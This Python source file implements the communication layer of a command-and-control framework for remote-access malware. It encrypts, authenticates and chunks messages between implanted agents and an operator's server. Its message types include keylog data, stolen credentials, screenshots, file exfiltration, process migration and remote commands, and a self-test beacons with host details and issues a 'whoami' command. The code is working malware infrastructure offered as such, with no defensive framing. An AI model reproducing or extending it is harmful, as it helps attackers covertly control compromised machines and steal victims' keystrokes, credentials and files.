#!/usr/bin/env python3
"""
C2 Protocol Specification and Message Handler
Complete implementation with encryption, compression, and integrity
"""

import json
import zlib
import hmac
import hashlib
import base64
import struct
import time
import os
from typing import Dict, Any, Optional, Tuple, Union, List
from enum import Enum
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

from Core.config_loader import config
from Core.logger import get_logger

log = get_logger('protocol')

class MessageType(Enum):
    """C2 Protocol message types"""
    
    # Agent -> Server
    BEACON = 0x01
    HEARTBEAT = 0x02
    RESULT = 0x03
    FILE_UPLOAD = 0x04
    KEYLOG = 0x05
    CREDENTIALS = 0x06
    REQUEST_COMMAND = 0x07
    SCREENSHOT = 0x08
    SYSTEM_INFO = 0x09
    ERROR = 0x0A
    
    # Server -> Agent
    COMMAND = 0x10
    FILE_DOWNLOAD = 0x11
    CONFIG_UPDATE = 0x12
    TERMINATE = 0x13
    SLEEP = 0x14
    JITTER = 0x15
    MIGRATE = 0x16
    UPDATE = 0x17
    NO_COMMAND = 0x18
    ACK = 0x19

class C2Protocol:
    """
    Complete C2 protocol implementation
    
    Message Format:
    [4 bytes: length][1 byte: type][1 byte: flags][2 bytes: msg_id][N bytes: encrypted_payload][32 bytes: HMAC]
    
    Flags:
    - 0x01: Compressed
    - 0x02: Encrypted
    - 0x04: Chunked
    - 0x08: Priority
    """
    
    HEADER_SIZE = 8
    HMAC_SIZE = 32
    MAX_MESSAGE_SIZE = 10 * 1024 * 1024  # 10MB
    CHUNK_SIZE = 64 * 1024  # 64KB chunks
    
    def __init__(self, shared_key: bytes = None):
        """Initialize protocol with shared key"""
        
        self.shared_key = shared_key or self._generate_key()
        self.message_counter = 0
        self.received_messages = {}  # For reassembling chunks
        
        # Derive encryption and HMAC keys from shared key
        self.enc_key = hashlib.sha256(self.shared_key + b'encryption').digest()
        self.hmac_key = hashlib.sha256(self.shared_key + b'authentication').digest()
        
        log.info("C2 Protocol initialized")
    
    def _generate_key(self) -> bytes:
        """Generate shared key from config or random"""
        
        auth_token = config.get('c2.auth_token', 'CHANGE_THIS_SECRET_TOKEN')
        return hashlib.sha256(auth_token.encode()).digest()
    
    def create_message(self, msg_type: MessageType, payload: Dict[str, Any],
                       compress: bool = True, encrypt: bool = True,
                       priority: bool = False) -> bytes:
        """
        Create a protocol message
        
        Args:
            msg_type: Message type
            payload: Message payload dictionary
            compress: Whether to compress payload
            encrypt: Whether to encrypt payload
            priority: Whether message is high priority
            
        Returns:
            Complete message bytes ready to send
        """
        
        # Serialize payload
        payload_bytes = json.dumps(payload).encode('utf-8')
        
        # Check size
        if len(payload_bytes) > self.MAX_MESSAGE_SIZE:
            raise ValueError(f"Payload too large: {len(payload_bytes)} bytes")
        
        # Apply compression if requested
        flags = 0
        if compress and len(payload_bytes) > 100:  # Only compress if worth it
            compressed = zlib.compress(payload_bytes, 9)
            if len(compressed) < len(payload_bytes):
                payload_bytes = compressed
                flags |= 0x01
                log.debug(f"Compressed payload from {len(payload_bytes)} to {len(compressed)} bytes")
        
        # Apply encryption if requested
        if encrypt:
            payload_bytes = self._encrypt_payload(payload_bytes)
            flags |= 0x02
        
        # Set priority flag if requested
        if priority:
            flags |= 0x08
        
        # Create message ID
        self.message_counter += 1
        msg_id = self.message_counter % 65536
        
        # Build header
        header = struct.pack('>IBBH',
            len(payload_bytes) + self.HEADER_SIZE + self.HMAC_SIZE,  # Total length
            msg_type.value,  # Message type
            flags,  # Flags
            msg_id  # Message ID
        )
        
        # Combine header and payload
        message = header + payload_bytes
        
        # Add HMAC
        hmac_value = self._calculate_hmac(message)
        message += hmac_value
        
        return message
    
    def parse_message(self, data: bytes) -> Tuple[MessageType, Dict[str, Any], Dict[str, Any]]:
        """
        Parse a protocol message
        
        Args:
            data: Raw message bytes
            
        Returns:
            Tuple of (message_type, payload, metadata)
        """
        
        if len(data) < self.HEADER_SIZE + self.HMAC_SIZE:
            raise ValueError(f"Message too short: {len(data)} bytes")
        
        # Extract HMAC and verify
        message = data[:-self.HMAC_SIZE]
        provided_hmac = data[-self.HMAC_SIZE:]
        expected_hmac = self._calculate_hmac(message)
        
        if not hmac.compare_digest(provided_hmac, expected_hmac):
            raise ValueError("HMAC verification failed")
        
        # Parse header
        length, type_byte, flags, msg_id = struct.unpack('>IBBH', message[:self.HEADER_SIZE])
        
        # Validate length
        if length != len(data):
            raise ValueError(f"Length mismatch: expected {length}, got {len(data)}")
        
        # Extract payload
        payload_bytes = message[self.HEADER_SIZE:]
        
        # Decrypt if encrypted
        if flags & 0x02:
            payload_bytes = self._decrypt_payload(payload_bytes)
        
        # Decompress if compressed
        if flags & 0x01:
            payload_bytes = zlib.decompress(payload_bytes)
        
        # Parse JSON payload
        try:
            payload = json.loads(payload_bytes.decode('utf-8'))
        except (json.JSONDecodeError, UnicodeDecodeError) as e:
            raise ValueError(f"Failed to parse payload: {e}")
        
        # Create metadata
        metadata = {
            'message_id': msg_id,
            'compressed': bool(flags & 0x01),
            'encrypted': bool(flags & 0x02),
            'chunked': bool(flags & 0x04),
            'priority': bool(flags & 0x08),
            'size': len(data)
        }
        
        # Get message type
        try:
            msg_type = MessageType(type_byte)
        except ValueError:
            raise ValueError(f"Unknown message type: {type_byte}")
        
        return msg_type, payload, metadata
    
    def _encrypt_payload(self, data: bytes) -> bytes:
        """Encrypt payload using AES-256-CBC"""
        
        # Generate IV
        iv = os.urandom(16)
        
        # Pad data to 16-byte boundary
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        
        # Encrypt
        cipher = Cipher(
            algorithms.AES(self.enc_key),
            modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        
        # Return IV + encrypted data
        return iv + encrypted
    
    def _decrypt_payload(self, data: bytes) -> bytes:
        """Decrypt payload using AES-256-CBC"""
        
        if len(data) < 16:
            raise ValueError("Encrypted data too short")
        
        # Extract IV
        iv = data[:16]
        encrypted = data[16:]
        
        # Decrypt
        cipher = Cipher(
            algorithms.AES(self.enc_key),
            modes.CBC(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(encrypted) + decryptor.finalize()
        
        # Remove padding
        unpadder = padding.PKCS7(128).unpadder()
        unpadded = unpadder.update(decrypted) + unpadder.finalize()
        
        return unpadded
    
    def _calculate_hmac(self, data: bytes) -> bytes:
        """Calculate HMAC-SHA256"""
        
        return hmac.new(self.hmac_key, data, hashlib.sha256).digest()
    
    def chunk_data(self, data: bytes, chunk_id: str) -> List[bytes]:
        """
        Split large data into chunks
        
        Args:
            data: Data to chunk
            chunk_id: Unique identifier for this chunk set
            
        Returns:
            List of chunk messages
        """
        
        chunks = []
        total_chunks = (len(data) + self.CHUNK_SIZE - 1) // self.CHUNK_SIZE
        
        for i in range(total_chunks):
            start = i * self.CHUNK_SIZE
            end = min(start + self.CHUNK_SIZE, len(data))
            chunk_data = data[start:end]
            
            chunk_payload = {
                'chunk_id': chunk_id,
                'chunk_index': i,
                'total_chunks': total_chunks,
                'data': base64.b64encode(chunk_data).decode()
            }
            
            # Create chunk message with chunk flag
            msg = self.create_message(
                MessageType.FILE_UPLOAD,
                chunk_payload,
                compress=False  # Don't compress individual chunks
            )
            
            # Set chunk flag manually
            msg_bytes = bytearray(msg)
            msg_bytes[5] |= 0x04  # Set chunk flag
            msg = bytes(msg_bytes)
            
            # Recalculate HMAC
            msg = msg[:-self.HMAC_SIZE]
            msg += self._calculate_hmac(msg)
            
            chunks.append(msg)
        
        return chunks
    
    def reassemble_chunks(self, chunk_messages: List[Dict]) -> bytes:
        """
        Reassemble chunks into original data
        
        Args:
            chunk_messages: List of chunk payload dictionaries
            
        Returns:
            Reassembled data
        """
        
        if not chunk_messages:
            raise ValueError("No chunks to reassemble")
        
        # Sort by chunk index
        chunk_messages.sort(key=lambda x: x['chunk_index'])
        
        # Verify we have all chunks
        total_chunks = chunk_messages[0]['total_chunks']
        if len(chunk_messages) != total_chunks:
            raise ValueError(f"Missing chunks: got {len(chunk_messages)}, expected {total_chunks}")
        
        # Reassemble
        data = b''
        for chunk in chunk_messages:
            chunk_data = base64.b64decode(chunk['data'])
            data += chunk_data
        
        return data
    
    def create_beacon(self, agent_info: Dict) -> bytes:
        """Create agent beacon message"""
        
        # Add authentication
        agent_data = f"{agent_info.get('hostname', '')}{agent_info.get('username', '')}"
        agent_info['auth'] = hmac.new(
            self.shared_key,
            agent_data.encode(),
            hashlib.sha256
        ).hexdigest()
        
        return self.create_message(MessageType.BEACON, agent_info, priority=True)
    
    def create_heartbeat(self, agent_id: str, status: Dict = None) -> bytes:
        """Create heartbeat message"""
        
        payload = {
            'agent_id': agent_id,
            'timestamp': time.time(),
            'status': status or {}
        }
        
        return self.create_message(MessageType.HEARTBEAT, payload, compress=False)
    
    def create_result(self, command_id: int, output: str, error: str = None,
                     exit_code: int = 0, execution_time: float = 0) -> bytes:
        """Create command result message"""
        
        payload = {
            'command_id': command_id,
            'output': output,
            'error': error,
            'exit_code': exit_code,
            'execution_time': execution_time,
            'timestamp': time.time()
        }
        
        return self.create_message(MessageType.RESULT, payload)
    
    def create_command(self, command_id: int, command: str, args: Dict = None) -> bytes:
        """Create command message"""
        
        payload = {
            'command_id': command_id,
            'command': command,
            'args': args or {},
            'timestamp': time.time()
        }
        
        return self.create_message(MessageType.COMMAND, payload, priority=True)

# Test the protocol
if __name__ == "__main__":
    import sys
    sys.path.insert(0, '/workspace')
    
    print("Testing C2 Protocol")
    print("-" * 50)
    
    # Create protocol instance
    protocol = C2Protocol()
    
    # Test beacon message
    agent_info = {
        'hostname': 'TEST-PC',
        'username': 'testuser',
        'platform': 'Windows 10',
        'ip': '192.168.1.100'
    }
    
    beacon_msg = protocol.create_beacon(agent_info)
    print(f"✅ Created beacon message: {len(beacon_msg)} bytes")
    
    # Parse the message
    msg_type, payload, metadata = protocol.parse_message(beacon_msg)
    print(f"✅ Parsed message type: {msg_type.name}")
    print(f"✅ Encrypted: {metadata['encrypted']}")
    print(f"✅ Compressed: {metadata['compressed']}")
    
    # Test command message
    cmd_msg = protocol.create_command(1, 'whoami')
    print(f"✅ Created command message: {len(cmd_msg)} bytes")
    
    # Test result message
    result_msg = protocol.create_result(1, 'testuser\\TEST-PC', execution_time=0.5)
    print(f"✅ Created result message: {len(result_msg)} bytes")
    
    # Test chunking for large data
    large_data = b'A' * (200 * 1024)  # 200KB
    chunks = protocol.chunk_data(large_data, 'test_chunk_001')
    print(f"✅ Split {len(large_data)} bytes into {len(chunks)} chunks")
    
    print("\n✅ C2 Protocol working correctly!")